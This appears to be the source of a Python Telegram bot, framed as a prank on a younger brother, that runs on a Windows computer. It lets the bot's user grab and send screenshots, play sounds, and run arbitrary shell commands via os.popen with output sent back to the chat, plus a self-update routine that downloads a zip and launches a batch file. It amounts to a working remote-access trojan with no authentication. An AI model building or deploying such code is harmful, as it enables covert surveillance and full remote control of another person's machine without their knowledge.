import telebot
import os
import sys

from dotenv import load_dotenv
import pyautogui
import playsound3

import requests

# def resource_path(relative_path):
#     """ Get absolute path to resource, works for dev and for PyInstaller """
#     try:
#         # PyInstaller creates a temp folder and stores path in _MEIPASS
#         base_path = sys._MEIPASS
#     except Exception:
#         base_path = os.path.abspath(".")

#     return os.path.join(base_path, relative_path)

def get_version():
    with open("version.txt") as version:
        VERSION = version.read()

        return VERSION

def check_available_version():
    url = "https://raw.githubusercontent.com/Speedy35462/Fun-Prank-Bot-For-Younger-Brother/main/version.txt"

    r = requests.get(url)
    r.raise_for_status()

    return r.text.strip()

def download_new_version():
    url = "https://github.com/Speedy35462/Fun-Prank-Bot-For-Younger-Brother/archive/refs/heads/main.zip"

    r = requests.get(url)

    with open("update.zip","wb") as f:
        f.write(r.content)
    
    import zipfile

    with zipfile.ZipFile("update.zip") as zip_ref:
        zip_ref.extractall("temp")

        with open("update.bat", "w") as f:
            with open("update.bat", "w") as f:
                f.write("@echo off\n"
                        "timeout /t 2 >nul\n"
                        "xcopy temp\\Fun-Prank-Bot-For-Younger-Brother-main\\* . /E /Y\n"
                        "rmdir /s /q temp\n"
                        "del /q update.zip\n"
                        "start "" main.exe\n"
                        "del \"%~f0\"\n")

        os.startfile("update.bat")
        sys.exit()

def notify_update_done():
    if os.path.exists("last_update_chat.txt"):
        with open("last_update_chat.txt") as f:
            chat_id = f.read().strip()

        bot.send_message(chat_id, "Update installed and bot restarted successfully!")

        os.remove("last_update_chat.txt")

load_dotenv()

VERSION = get_version()

bot = telebot.TeleBot(os.getenv("BOT_TOKEN"), parse_mode=None)

notify_update_done()

markup = telebot.types.ReplyKeyboardMarkup()
send_screenshot = telebot.types.KeyboardButton('Send Screenshot')
play_sound = telebot.types.KeyboardButton('Play Sound')
console_acces = telebot.types.KeyboardButton('Console')
markup.row(send_screenshot,play_sound)
markup.row(console_acces)

if not os.path.exists("assets/images"):
    os.makedirs("assets/images")

eating_sound = ""

@bot.message_handler(commands=['start','help'])
def send_welcome(message):
    bot.send_message(message.chat.id, "Hello new user",reply_markup=markup)

@bot.message_handler(commands=['version'])
def send_version(message):
    VERSION = get_version()
    bot.send_message(message.chat.id, f"Version: {VERSION}")

@bot.message_handler(commands=['update'])
def update(message):
    bot.send_message(message.chat.id, "Checking updates...")

    new_version = check_available_version()

    bot.send_message(
        message.chat.id,
        f"Current version: {VERSION}\nAvailable version: {new_version}"
    )

    if float(new_version) > float(VERSION):
        with open("last_update_chat.txt", "w") as f:
            f.write(str(message.chat.id))

        bot.send_message(message.chat.id, "Updating...")

        download_new_version()

    else:
        bot.send_message(message.chat.id, "Version is up to date")


@bot.message_handler(func=lambda message: message.text == "Send Screenshot")
def send_screenshot(message):
    bot.send_message(message.chat.id,"Sending Screenshot...")

    # screenshot = pyscreeze.screenshot("assets/images/screenshot.png")
    pyautogui.screenshot("assets/images/screenshot.png")

    with open("assets/images/screenshot.png",'rb') as _screenshot:
        bot.send_photo(message.chat.id,_screenshot)
    

@bot.message_handler(func=lambda message: message.text == "Play Sound")
def play_sound(message):
    bot.send_message(message.chat.id,"Playing Sound...")
    playsound3.playsound("assets/music/fun-sound.mp3")

@bot.message_handler(func=lambda message: message.text == "Console")
def console_command_input(message):
    sent_msg = bot.send_message(message.chat.id, "Enter command for console:")
    bot.register_next_step_handler(sent_msg, execute_console_command)

def execute_console_command(message):
    command = message.text
    bot.send_message(message.chat.id, f"Running command: `{command}`...")
    
    try:
        # Run the command and grab the output
        output = os.popen(command).read()
        
        if output.strip():
            bot.send_message(message.chat.id, f"Output:\n{output}")
        else:
            bot.send_message(message.chat.id, "Command executed with no output.")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"Error executing command: {e}")
        
# @bot.message_handler(func=lambda message: True)
# def echo_all(message):
#     bot.send_message(message.chat.id, message.text)

bot.infinity_polling()
